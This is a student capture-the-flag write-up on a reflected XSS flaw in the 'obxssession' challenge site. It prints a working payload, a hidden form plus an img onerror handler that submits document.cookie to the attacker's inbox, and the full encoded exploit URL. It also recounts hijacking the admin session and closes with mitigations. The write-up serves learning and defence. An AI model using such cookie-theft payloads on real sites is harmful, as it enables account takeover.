obxssession
===========

Overview
--------
For this challenge, we were given access to a website. In this website, there were a few functionalities available. Before authenticating, a user is able to read some articles about conspiracy theories, create an account and login. After authenticating, the user could also exchange messages with other users and visit his profile. The goal for the challenge was to explore the vulnerability of the website and try to get access to a private conspiracy theory that belongs to the admin.


Vulnerability
-------------
We wanted to try and use XSS to get access to the admin session cookie, so we could "pretend" to be him, and ultimately get access to the flag. So we would send some link that would have an attack written on it. However, in the introductory text of the challenge, there was a hint that the admin is very paranoid and it will only open links which the domain is the *obxssession* site. Therefore, we needed to find an endpoint in the website that allowed us to input a script, in other words, an endpoint where our input would not be preprocessed.
We could find an input vulnerability. In the page https://obxssession.is.hackthe.space/error?m=theory%20is%20private&p=/theory/5
After trying to change the value of the message m, we firstly tried to change the value of it to some random string and, afterwards, I changed it to a script with an alert function. We could see that our input was not being properly sanitized before they were embedded into the page, as our input generated a warning pop-up from the website. In other words, we have an endpoint where our input can be interpreted as code and where we can build an exploit.


Exploitation
------------
As mentioned before, our goal for this challenge was to get a hold of the admin session cookie, so we could authenticate ourselves as him. To do so, we (Ana Lino 12139847, Tiago Mota 12137605, Claudia Silva 12135542 and myself) decided to try and send a link to the admin which would have some kind of attack ãnd would return to us the session cookie. In other words, we wanted to perform a cross-site scripting(XSS) attack, more precisely a Reflected XSS attack.
The first step was to find a vulnerability that we could exploit. We started by trying to execute the following javaScript code in different endpoints:

<pre><code>
    <SCRIPT>alert(1)</SCRIPT>
</code></pre>

We could find the previously mentioned vulnerability. Now that we have an URL that we can alter, we need to develop a payload to append to it.
First, we know that after the admin opens our url, we want to receive a message from him with his session cookie. In order to do so, we took advantage of a *form*, very similar to the one that enables us to send messages to other users of the website.
We would set a receiver to be our number within the website, and to figure it out, we would look at the Page Source of the page *send message*, and see that at the time my number was 66. Other inputs, such as subject and the content could be set has some random values, as they would directly affect the outcome of our attack.
We would purposely provoke an error in the message we send (*img src=/*). As a reaction to that error that would appear after the user open the website would be a message with a document.cookie (*onerror="document.Attack.contents.value = document.cookie;document.Attack.submit();*).
The payload develop was:

<pre><code>
    p=<form name="Attack" action="/send" method="POST"> <input name="subject" value="subject random"> <input name="receiver" value=66> <input name="contents" value="somerandommessage"> </form> <img src=/ onerror="document.Attack.contents.value = document.cookie;document.Attack.submit();"></img>
</code></pre>

After url encoding this previous code, we added this to the vulnerable url, and ended with this link:
https://obxssession.is.hackthe.space/error?m=theory%20is%20private&p=/theory/5p%3D%3Cform%20name%3D%22Attack%22%20action%3D%22%2Fsend%22%20method%3D%22POST%22%3E%20%3Cinput%20name%3D%22subject%22%20value%3D%22subject%20random%22%3E%20%3Cinput%20name%3D%22receiver%22%20value%3D66%3E%20%3Cinput%20name%3D%22contents%22%20value%3D%22somerandommessage%22%3E%20%3C%2Fform%3E%20%3Cimg%20src%3D%2F%20onerror%3D%22document.Attack.contents.value%20%3D%20document.cookie%3Bdocument.Attack.submit%28%29%3B%22%3E%3C%2Fimg%3E

First, I tried to test my attack by creating another user, and sending it a message with some random subject and the content being my URL. After opening the message with this second user, they receive a message with the cookie. I repeated this, and sent a message to the admin. After a few seconds, we received a message with his cookie.
I opened the settings of my browser, changed the cookie session to the one received, and in the profile endpoint, under my theories, we could find a flag.


Solution
--------
The first step to prevent this attack would be to preprocess the user input, so that when the page of the website is open the user's input would never be interpreted as code. To do so, a programmer should implement some kind of encoding of HTML special characters (or use some good escaping library). This is done in other endpoints of the website.
We can also use CSP (Content Security Policy) that will "control which resources can be loaded by a web page". CSP can be used to block inline scripts and to prevent data from being loaded from untrusted sources. It can be used to prevent XSS attacks.
